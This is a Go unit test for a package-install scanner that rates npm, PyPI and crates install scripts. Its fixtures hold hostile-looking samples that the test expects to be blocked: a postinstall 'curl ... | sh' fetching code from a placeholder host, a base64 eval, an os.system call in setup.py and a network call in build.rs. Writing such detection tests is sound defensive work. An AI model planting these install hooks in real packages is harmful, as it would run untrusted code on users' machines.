package check

import (
	"testing"

	"github.com/tiagosilva07/zyrax-guard/internal/verdict"
)

func TestAnalyzeInstallScripts(t *testing.T) {
	cases := []struct {
		name  string
		eco   string
		files map[string]string
		want  verdict.Level
	}{
		{"npm none", "npm", map[string]string{"package/package.json": `{"name":"x"}`}, verdict.LevelInfo},
		{"npm benign postinstall", "npm", map[string]string{"package/package.json": `{"scripts":{"postinstall":"node-gyp rebuild"}}`}, verdict.LevelWarn},
		{"npm download-and-run", "npm", map[string]string{"package/package.json": `{"scripts":{"postinstall":"curl https://x/y | sh"}}`}, verdict.LevelBlock},
		{"npm obfuscated eval", "npm", map[string]string{"package/index.js": "eval(Buffer.from('aGVsbG8gd29ybGQgbG9uZyBlbm91Z2ggdG8gY291bnQgYXMgYSBibG9iIGZvciB0aGUgcGF0dGVybiBtYXRjaGVyIHllcw==','base64').toString())"}, verdict.LevelBlock},
		{"pypi setup exec+net", "pypi", map[string]string{"setup.py": "import os,urllib.request\nos.system('id')"}, verdict.LevelBlock},
		{"pypi wheel-only sentinel", "pypi", map[string]string{}, verdict.LevelInfo},
		{"crates build net+spawn", "crates", map[string]string{"build.rs": "use std::process::Command;\nlet _ = reqwest::blocking::get(\"http://x\");"}, verdict.LevelBlock},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			s := AnalyzeInstallScripts(c.eco, c.files)
			if s.Check != verdict.RuleSuspiciousInstall {
				t.Fatalf("wrong rule: %s", s.Check)
			}
			if s.Level != c.want {
				t.Errorf("level=%v want %v (msg=%q)", s.Level, c.want, s.Message)
			}
		})
	}
}
